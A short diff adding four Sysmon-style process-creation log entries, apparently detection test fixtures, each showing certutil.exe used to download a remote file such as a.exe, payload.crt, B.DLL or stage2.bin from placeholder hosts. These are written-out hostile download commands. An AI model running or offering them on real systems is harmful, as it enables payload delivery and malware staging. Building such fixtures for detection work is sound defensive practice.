@@ -1,0 +1,4 @@
+{"EventID":1,"UtcTime":"2026-08-03 11:04:22.117","Computer":"WKSTN-014","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://198.51.100.20/a.exe a.exe"}
+{"EventID":1,"UtcTime":"2026-08-03 11:05:37.882","Computer":"WKSTN-021","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -verifyctl -f -split http://203.0.113.44/payload.crt"}
+{"EventID":1,"UtcTime":"2026-08-03 11:06:10.004","Computer":"WKSTN-033","Image":"C:\\Windows\\SysWOW64\\certutil.exe","CommandLine":"CERTUTIL.EXE -URLCACHE -SPLIT -F HTTP://198.51.100.77/B.DLL"}
+{"EventID":1,"UtcTime":"2026-08-03 11:07:55.610","Computer":"WKSTN-041","Image":"C:\\Users\\Public\\certutil.exe","CommandLine":"certutil -urlcache -f https://cdn.example.invalid/stage2.bin s.bin"}
